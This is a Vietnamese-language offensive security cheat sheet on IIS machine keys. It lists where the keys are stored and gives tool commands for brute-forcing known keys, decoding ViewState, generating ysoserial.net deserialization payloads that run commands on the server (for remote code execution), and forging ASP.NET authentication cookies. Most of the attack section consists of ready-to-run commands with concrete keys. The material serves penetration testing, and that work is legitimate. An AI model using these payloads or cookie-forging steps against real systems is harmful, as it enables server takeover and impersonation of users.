# IIS Machine Keys

> Machine key được sử dụng để mã hóa và giải mã dữ liệu cookie xác thực Forms Authentication và dữ liệu ViewState, đồng thời dùng để xác minh thông tin nhận diện session state ngoài tiến trình (out-of-process).

## Tóm tắt

* [Định dạng ViewState](#viewstate-format)
* [Định dạng và vị trí Machine Key](#machine-key-format-and-locations)
* [Xác định Machine Key đã biết](#identify-known-machine-key)
* [Giải mã ViewState](#decode-viewstate)
* [Tạo ViewState để RCE](#generate-viewstate-for-rce)

  * [MAC không được bật](#mac-is-not-enabled)
  * [MAC được bật và mã hóa bị tắt](#mac-is-enabled-and-encryption-is-disabled)
  * [MAC được bật và mã hóa được bật](#mac-is-enabled-and-encryption-is-enabled)
* [Chỉnh sửa Cookie bằng Machine Key](#edit-cookies-with-the-machine-key)
* [Tài liệu tham khảo](#references)

## Định dạng ViewState

ViewState trong IIS là một kỹ thuật được sử dụng để duy trì trạng thái của các web control giữa các lần postback trong ứng dụng ASP.NET. Nó lưu trữ dữ liệu trong một hidden field trên trang, cho phép trang duy trì dữ liệu người dùng đã nhập và các thông tin trạng thái khác.

| Định dạng          | Thuộc tính                                                   |
| ------------------ | ------------------------------------------------------------ |
| Base64             | `EnableViewStateMac=False`,  `ViewStateEncryptionMode=False` |
| Base64 + MAC       | `EnableViewStateMac=True`                                    |
| Base64 + Encrypted | `ViewStateEncryptionMode=True`                               |

Theo mặc định cho đến tháng 9 năm 2014, thuộc tính `enableViewStateMac` được đặt thành `False`.

Thông thường, ViewState chưa được mã hóa sẽ bắt đầu bằng chuỗi `/wEP`.

## Định dạng và vị trí Machine Key

Một `machineKey` trong IIS là một phần tử cấu hình trong ASP.NET, xác định các khóa mật mã và thuật toán được sử dụng để mã hóa và xác thực dữ liệu, chẳng hạn như ViewState và token Forms Authentication. Nó đảm bảo tính nhất quán và bảo mật giữa các web application, đặc biệt trong môi trường web farm.

Định dạng của một machineKey như sau.

```xml
<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 (default) | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto (default) | DES | 3DES | AES | alg:algorithm_name]" />
```

Thuộc tính `validationKey` chỉ định một chuỗi hexadecimal được sử dụng để xác thực dữ liệu, đảm bảo dữ liệu chưa bị giả mạo.

Thuộc tính `decryptionKey` cung cấp một chuỗi hexadecimal được sử dụng để mã hóa và giải mã dữ liệu nhạy cảm.

Thuộc tính `validation` xác định thuật toán được sử dụng để xác thực dữ liệu, với các tùy chọn như SHA1, MD5, 3DES, AES và HMACSHA256, cùng nhiều tùy chọn khác.

Thuộc tính `decryption` xác định thuật toán mã hóa, với các tùy chọn như Auto, DES, 3DES và AES, hoặc có thể chỉ định một thuật toán tùy chỉnh bằng `alg:algorithm_name`.

Ví dụ sau đây về một machineKey được lấy từ [tài liệu Microsoft](https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication).

```xml
<machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
```

Các vị trí phổ biến của **web.config** / **machine.config**

* 32-bit

  * `C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config`
  * `C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config`
* 64-bit

  * `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config`
  * `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config`
* trong registry khi **AutoGenerate** được bật (trích xuất bằng [irsdl/machineKeyFinder.aspx](https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab))

  * `HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4`
  * `HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey`

## Xác định Machine Key đã biết

Thử nhiều machine key từ các sản phẩm đã biết, tài liệu Microsoft hoặc các nguồn khác trên Internet.

* https://github.com/isclayton/viewstalker

  ```powershell
  ./viewstalker --viewstate /wEPD...TYQ== -m 3E92B2D6 -M ./MachineKeys2.txt
  ____   ____.__                       __         .__   __
  \   \ /   /|__| ______  _  _________/  |______  |  | |  | __ ___________ 
  \   Y   / |  |/ __ \ \/ \/ /  ___/\   __\__  \ |  | |  |/ // __ \_  __ \
  \     /  |  \  ___/\     /\___ \  |  |  / __ \|  |_|    <\  ___/|  | \/
  \___/   |__|\___  >\/\_//____  > |__| (____  /____/__|_ \\___  >__|   
                  \/           \/            \/          \/    \/        \

  KEY FOUND!!!
  Host:   
  Validation Key: XXXXX,XXXXX
  ```

* https://github.com/blacklanternsecurity/badsecrets

  ```ps1
  python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6
  Matching MachineKeys found!
  validationKey: C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE validationAlgo: SHA1
  ```

* https://github.com/irsdl/crapsecrets

  ```ps1
  python3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -r
  python3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -mrd 5
  python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -u http://update.microsoft.com/
  python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -u http://10.10.10.10:8080/
  python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -mkf ./crapsecrets/resources/aspnet_machinekeys.txt -u http://10.10.10.10:8080/a1/b/c1/
  ```

* https://github.com/NotSoSecure/Blacklist3r

  ```powershell
  AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy
  ```

* https://github.com/0xacb/viewgen

  ```powershell
  $ viewgen --guess "/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
  [+] ViewState is not encrypted
  [+] Signature algorithm: SHA1
  ```

Danh sách các machine key đáng chú ý để sử dụng:

* [NotSoSecure/Blacklist3r/MachineKeys.txt](https://github.com/NotSoSecure/Blacklist3r/raw/f10304bc90efaca56676362a981d93cc312d9087/MachineKey/AspDotNetWrapper/AspDotNetWrapper/Resource/MachineKeys.txt)
* [isclayton/viewstalker/MachineKeys2.txt](https://raw.githubusercontent.com/isclayton/viewstalker/main/MachineKeys2.txt)
* [blacklanternsecurity/badsecrets/aspnet_machinekeys.txt](https://raw.githubusercontent.com/blacklanternsecurity/badsecrets/dev/badsecrets/resources/aspnet_machinekeys.txt)

## Giải mã ViewState

* [BApp Store > ViewState Editor](https://portswigger.net/bappstore/ba17d9fb487448b48368c22cb70048dc) - ViewState Editor là một extension cho phép xem và chỉnh sửa cấu trúc cũng như nội dung của dữ liệu ASP ViewState V1.1 và V2.0.
* https://github.com/0xacb/viewgen

  ```powershell
  viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
  ```

## Tạo ViewState để RCE

Trước tiên cần giải mã ViewState để xác định MAC và encryption có được bật hay không.

**Yêu cầu**:

* `__VIEWSTATE`
* `__VIEWSTATEGENERATOR`

### MAC không được bật

```ps1
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c whoami"
```

### MAC được bật và mã hóa bị tắt

* Tìm machine key (`validationkey`) bằng `badsecrets`, `viewstalker`, `AspDotNetWrapper.exe` hoặc `viewgen`

  ```ps1
  AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy
  # --modifier = `__VIEWSTATEGENERATOR` parameter value
  # --encrypteddata = `__VIEWSTATE` parameter value of the target application
  ```

* Sau đó tạo một ViewState bằng https://github.com/pwntester/ysoserial.net, có thể sử dụng cả gadget `TextFormattingRunProperties` và `TypeConfuseDelegate`.

  ```ps1
  .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
  .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --generator=3E92B2D6 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

  # --generator = `__VIEWSTATEGENERATOR` parameter value
  # --validationkey = validation key from the previous command
  ```

### MAC được bật và mã hóa được bật

Thuật toán validation mặc định là `HMACSHA256` và thuật toán decryption mặc định là `AES`.

Nếu `__VIEWSTATEGENERATOR` bị thiếu nhưng ứng dụng sử dụng .NET Framework phiên bản 4.0 trở xuống, có thể sử dụng root của app (ví dụ: `--apppath="/testaspx/"`).

* **.NET Framework < 4.5**, ASP.NET luôn chấp nhận `__VIEWSTATE` không được mã hóa nếu xóa tham số `__VIEWSTATEENCRYPTED` khỏi request

  ```ps1
  .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
  ```

* **.NET Framework > 4.5**, machineKey có thuộc tính: `compatibilityMode="Framework45"`

  ```ps1
  .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
  ```

## Chỉnh sửa Cookie bằng Machine Key

Nếu có `machineKey` nhưng ViewState bị vô hiệu hóa.

ASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptTools

```powershell
# giải mã cookie
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes

# mã hóa cookie (chỉnh sửa Decrypted.txt)
$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
```

## Tài liệu tham khảo

* [Phân tích chuyên sâu về .NET ViewState Deserialization và cách khai thác - Swapneil Kumar Dash - October 22, 2019](https://web.archive.org/web/20250916225422/https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
* [Khai thác Deserialisation trong ASP.NET thông qua ViewState - Soroush Dalili - April 23, 2019](https://web.archive.org/web/20250806010506/https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [Khai thác ViewState Deserialization bằng Blacklist3r và YSoSerial.Net - Claranet - June 13, 2019](https://web.archive.org/web/20250810191756/https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet)
* [Dự án Blacklist3r - @notsosecure - November 23, 2018](https://web.archive.org/web/20260116051627/https://notsosecure.com/project-blacklist3r)
* [View State, IIS Forever Day không thể vá đang bị khai thác tích cực - Zeroed - July 21, 2024](https://web.archive.org/web/20260107194152/https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/)
